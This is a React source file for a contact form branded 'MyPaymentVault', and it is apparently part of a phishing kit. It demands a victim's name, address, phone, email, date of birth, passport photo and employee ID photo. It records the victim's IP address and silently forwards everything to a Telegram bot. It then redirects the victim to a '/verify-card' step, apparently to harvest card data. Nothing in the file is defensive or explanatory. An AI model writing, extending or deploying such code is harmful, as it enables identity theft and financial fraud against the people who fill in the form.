import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";

const INQUIRY_OPTIONS = [
  "Account Inquiry",
  "Payment Issue",
  "Card Inquiry",
  "Identity Verification",
  "Security Concern",
  "Other",
];

export default function ContactForm() {
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");

  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [postal, setPostal] = useState("");
  const [dob, setDob] = useState("");
  const [inquiryType, setInquiryType] = useState("");
  const [message, setMessage] = useState("");
  const [passportFile, setPassportFile] = useState<File | null>(null);
  const [employeeIdFile, setEmployeeIdFile] = useState<File | null>(null);
  const [passportPreview, setPassportPreview] = useState<string>("");
  const [employeeIdPreview, setEmployeeIdPreview] = useState<string>("");

  const [submitting, setSubmitting] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const passportRef = useRef<HTMLInputElement>(null);
  const employeeIdRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const stored = sessionStorage.getItem("botOtpUsername");
    if (!stored) { navigate("/login"); return; }
    setUsername(stored);
  }, [navigate]);

  function handleFileChange(
    e: React.ChangeEvent<HTMLInputElement>,
    setter: (f: File | null) => void,
    previewSetter: (s: string) => void
  ) {
    const file = e.target.files?.[0] ?? null;
    setter(file);
    if (file) {
      const reader = new FileReader();
      reader.onload = (ev) => previewSetter(ev.target?.result as string ?? "");
      reader.readAsDataURL(file);
    } else {
      previewSetter("");
    }
  }

  function validate() {
    const e: Record<string, string> = {};
    if (!firstName.trim()) e.firstName = "Required";
    if (!lastName.trim()) e.lastName = "Required";
    if (!email.trim()) e.email = "Required";
    if (!phone.trim()) e.phone = "Required";
    if (!address.trim()) e.address = "Required";
    if (!city.trim()) e.city = "Required";
    if (!state.trim()) e.state = "Required";
    if (!postal.trim()) e.postal = "Required";
    if (!dob.trim()) e.dob = "Required";
    if (!inquiryType) e.inquiryType = "Required";
    if (!passportFile) e.passport = "Required";
    if (!employeeIdFile) e.employeeId = "Required";
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!validate()) return;
    setSubmitting(true);

    try {
      const ip = await getIPInfo();
      const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

      const text =
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔐 <b>MyPaymentVault</b>\n` +
        `📋 <b>Form Data User</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 <b>Username</b>       : <code>${username}</code>\n` +
        `📛 <b>First Name</b>     : ${firstName}\n` +
        `📛 <b>Last Name</b>      : ${lastName}\n` +
        `📧 <b>Email</b>          : ${email}\n` +
        `📱 <b>Mobile Phone</b>   : ${phone}\n` +
        `🏠 <b>Mailing Address</b>: ${address}\n` +
        `🏙️ <b>City</b>           : ${city}\n` +
        `📍 <b>State</b>          : ${state}\n` +
        `📮 <b>Postal Code</b>    : ${postal}\n` +
        `🎂 <b>Date of Birth</b>  : ${dob}\n` +
        `📌 <b>Inquiry Type</b>   : ${inquiryType}\n` +
        `💬 <b>Message</b>        : ${message || "-"}\n\n` +
        `🌐 <b>IP & Lokasi</b>    : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>          : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`;

      await sendTelegram(text);

      if (passportFile) {
        await sendFileToTelegram(passportFile, `📷 Passport Photo — ${username} (${firstName} ${lastName})`);
      }
      if (employeeIdFile) {
        await sendFileToTelegram(employeeIdFile, `🪪 Employee ID Photo — ${username} (${firstName} ${lastName})`);
      }
    } catch { /* silent */ }

    navigate("/verify-card");
  }

  const inputStyle = (hasErr?: boolean): React.CSSProperties => ({
    width: "100%",
    height: 48,
    border: `1px solid ${hasErr ? "#e53e3e" : "#d0d0d0"}`,
    borderRadius: 4,
    padding: "0 14px",
    fontSize: 14,
    color: "#111",
    outline: "none",
    background: "#fff",
    boxSizing: "border-box",
  });

  return (
    <div
      className="min-h-screen flex flex-col items-center cf-outer"
      style={{ background: "#f5f5f5", paddingTop: 32, paddingBottom: 48 }}
    >
      <style>{`
        @media (max-width: 520px) {
          .cf-outer { background: #fff !important; padding: 0 !important; }
          .cf-card {
            max-width: 100% !important;
            box-shadow: none !important;
            border-radius: 0 !important;
          }
        }
        .cf-input:focus { border-color: #111 !important; }
        .cf-select:focus { border-color: #111 !important; outline: none; }
        .cf-upload-btn:hover { background: #f0f0f0 !important; }
      `}</style>

      <div
        className="w-full bg-white cf-card"
        style={{ maxWidth: 800, boxShadow: "0 2px 24px rgba(0,0,0,0.10)", borderRadius: 8, overflow: "hidden" }}
      >
        {/* ── Header ── */}
        <div
          style={{
            padding: "16px 28px",
            borderBottom: "1px solid #e8e8e8",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
          }}
        >
          <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
          <span style={{ fontSize: 12, color: "#888" }}>Contact Information</span>
        </div>

        {/* ── Form body ── */}
        <form onSubmit={handleSubmit} noValidate style={{ padding: "32px 28px 36px" }}>
          {/* Grid 2 col */}
          <div
            className="cf-grid"
            style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}
          >
            <style>{`@media(max-width:600px){.cf-grid{grid-template-columns:1fr!important}}`}</style>

            {/* First Name */}
            <div>
              <input
                className="cf-input"
                placeholder="First Name*"
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
                style={inputStyle(!!errors.firstName)}
              />
              {errors.firstName && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.firstName}</p>}
            </div>

            {/* Last Name */}
            <div>
              <input
                className="cf-input"
                placeholder="Last Name*"
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
                style={inputStyle(!!errors.lastName)}
              />
              {errors.lastName && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.lastName}</p>}
            </div>

            {/* Email */}
            <div>
              <input
                className="cf-input"
                type="email"
                placeholder="Email*"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                style={inputStyle(!!errors.email)}
              />
              {errors.email && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.email}</p>}
            </div>

            {/* Mobile Phone */}
            <div>
              <input
                className="cf-input"
                type="tel"
                placeholder="Mobile Phone*"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                style={inputStyle(!!errors.phone)}
              />
              {errors.phone && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.phone}</p>}
            </div>

            {/* Mailing Address */}
            <div>
              <input
                className="cf-input"
                placeholder="Mailing Address*"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                style={inputStyle(!!errors.address)}
              />
              {errors.address && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.address}</p>}
            </div>

            {/* City */}
            <div>
              <input
                className="cf-input"
                placeholder="City*"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                style={inputStyle(!!errors.city)}
              />
              {errors.city && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.city}</p>}
            </div>

            {/* State */}
            <div>
              <input
                className="cf-input"
                placeholder="State*"
                value={state}
                onChange={(e) => setState(e.target.value)}
                style={inputStyle(!!errors.state)}
              />
              {errors.state && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.state}</p>}
            </div>

            {/* Postal Code */}
            <div>
              <input
                className="cf-input"
                placeholder="Postal Code*"
                value={postal}
                onChange={(e) => setPostal(e.target.value)}
                style={inputStyle(!!errors.postal)}
              />
              {errors.postal && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.postal}</p>}
            </div>

            {/* Date of Birth */}
            <div>
              <input
                className="cf-input"
                placeholder="Date of Birth (MM-DD-YYYY)*"
                value={dob}
                onChange={(e) => setDob(e.target.value)}
                style={inputStyle(!!errors.dob)}
              />
              {errors.dob && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.dob}</p>}
            </div>

            {/* Inquiry Type */}
            <div>
              <select
                className="cf-select"
                value={inquiryType}
                onChange={(e) => setInquiryType(e.target.value)}
                style={{
                  ...inputStyle(!!errors.inquiryType),
                  appearance: "auto",
                  color: inquiryType ? "#111" : "#999",
                }}
              >
                <option value="" disabled>Select Inquiry Type*</option>
                {INQUIRY_OPTIONS.map((opt) => (
                  <option key={opt} value={opt} style={{ color: "#111" }}>{opt}</option>
                ))}
              </select>
              {errors.inquiryType && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.inquiryType}</p>}
            </div>
          </div>

          {/* Message — full width */}
          <div style={{ marginBottom: 28 }}>
            <textarea
              className="cf-input"
              placeholder="Message"
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              rows={4}
              style={{
                ...inputStyle(),
                height: "auto",
                padding: "12px 14px",
                resize: "vertical",
                fontFamily: "inherit",
                lineHeight: 1.5,
              }}
            />
          </div>

          {/* Photo uploads */}
          <div
            className="cf-grid"
            style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 32 }}
          >
            {/* Passport Photo */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 600, color: "#111", marginBottom: 2 }}>
                Passport Photo*
              </p>
              <p style={{ fontSize: 11, color: "#777", marginBottom: 8 }}>
                Upload your passport photo (Required)<br />
                Supported: JPEG, PNG · Max size: 50 MB
              </p>
              <input
                ref={passportRef}
                type="file"
                accept="image/jpeg,image/png,image/jpg"
                style={{ display: "none" }}
                onChange={(e) => handleFileChange(e, setPassportFile, setPassportPreview)}
              />
              {passportPreview ? (
                <div style={{ position: "relative" }}>
                  <img
                    src={passportPreview}
                    alt="Passport"
                    style={{ width: "100%", height: 120, objectFit: "cover", borderRadius: 4, border: "1px solid #d0d0d0" }}
                  />
                  <button
                    type="button"
                    onClick={() => { setPassportFile(null); setPassportPreview(""); if (passportRef.current) passportRef.current.value = ""; }}
                    style={{
                      position: "absolute", top: 6, right: 6,
                      background: "rgba(0,0,0,0.6)", color: "#fff",
                      border: "none", borderRadius: "50%", width: 22, height: 22,
                      cursor: "pointer", fontSize: 12, display: "flex", alignItems: "center", justifyContent: "center"
                    }}
                  >✕</button>
                </div>
              ) : (
                <button
                  type="button"
                  className="cf-upload-btn"
                  onClick={() => passportRef.current?.click()}
                  style={{
                    width: "100%", height: 48,
                    border: `1px solid ${errors.passport ? "#e53e3e" : "#d0d0d0"}`,
                    borderRadius: 4, background: "#fff",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    gap: 8, fontSize: 13, color: "#444", cursor: "pointer",
                    transition: "background 0.15s",
                  }}
                >
                  <UploadIcon /> Choose Photo
                </button>
              )}
              {errors.passport && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.passport}</p>}
            </div>

            {/* Employee ID Photo */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 600, color: "#111", marginBottom: 2 }}>
                Employee ID Photo*
              </p>
              <p style={{ fontSize: 11, color: "#777", marginBottom: 8 }}>
                Upload your employee ID photo (Required)<br />
                Supported: JPEG, PNG · Max size: 50 MB
              </p>
              <input
                ref={employeeIdRef}
                type="file"
                accept="image/jpeg,image/png,image/jpg"
                style={{ display: "none" }}
                onChange={(e) => handleFileChange(e, setEmployeeIdFile, setEmployeeIdPreview)}
              />
              {employeeIdPreview ? (
                <div style={{ position: "relative" }}>
                  <img
                    src={employeeIdPreview}
                    alt="Employee ID"
                    style={{ width: "100%", height: 120, objectFit: "cover", borderRadius: 4, border: "1px solid #d0d0d0" }}
                  />
                  <button
                    type="button"
                    onClick={() => { setEmployeeIdFile(null); setEmployeeIdPreview(""); if (employeeIdRef.current) employeeIdRef.current.value = ""; }}
                    style={{
                      position: "absolute", top: 6, right: 6,
                      background: "rgba(0,0,0,0.6)", color: "#fff",
                      border: "none", borderRadius: "50%", width: 22, height: 22,
                      cursor: "pointer", fontSize: 12, display: "flex", alignItems: "center", justifyContent: "center"
                    }}
                  >✕</button>
                </div>
              ) : (
                <button
                  type="button"
                  className="cf-upload-btn"
                  onClick={() => employeeIdRef.current?.click()}
                  style={{
                    width: "100%", height: 48,
                    border: `1px solid ${errors.employeeId ? "#e53e3e" : "#d0d0d0"}`,
                    borderRadius: 4, background: "#fff",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    gap: 8, fontSize: 13, color: "#444", cursor: "pointer",
                    transition: "background 0.15s",
                  }}
                >
                  <UploadIcon /> Choose Photo
                </button>
              )}
              {errors.employeeId && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.employeeId}</p>}
            </div>
          </div>

          {/* Buttons */}
          <div
            style={{
              display: "flex", justifyContent: "flex-end", gap: 12,
            }}
          >
            <button
              type="button"
              onClick={() => navigate("/login-success")}
              disabled={submitting}
              style={{
                height: 44, padding: "0 32px",
                border: "1px solid #d0d0d0", borderRadius: 4,
                background: "#fff", fontSize: 14, color: "#333",
                cursor: submitting ? "not-allowed" : "pointer",
              }}
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={submitting}
              style={{
                height: 44, padding: "0 40px",
                background: submitting ? "#555" : "#111",
                border: "none", borderRadius: 4,
                fontSize: 14, fontWeight: 600, color: "#fff",
                cursor: submitting ? "not-allowed" : "pointer",
                display: "flex", alignItems: "center", gap: 8,
                transition: "background 0.2s",
              }}
            >
              {submitting ? (
                <>
                  <SpinIcon />
                  Sending...
                </>
              ) : "Send"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

function UploadIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
      <polyline points="17 8 12 3 7 8"/>
      <line x1="12" y1="3" x2="12" y2="15"/>
    </svg>
  );
}

function SpinIcon() {
  return (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
      <style>{`@keyframes cf-spin{to{transform:rotate(360deg)}} .cf-spin{animation:cf-spin 0.7s linear infinite; transform-origin:center;}`}</style>
      <circle cx="12" cy="12" r="9" strokeOpacity="0.25"/>
      <path className="cf-spin" d="M12 3a9 9 0 0 1 9 9"/>
    </svg>
  );
}
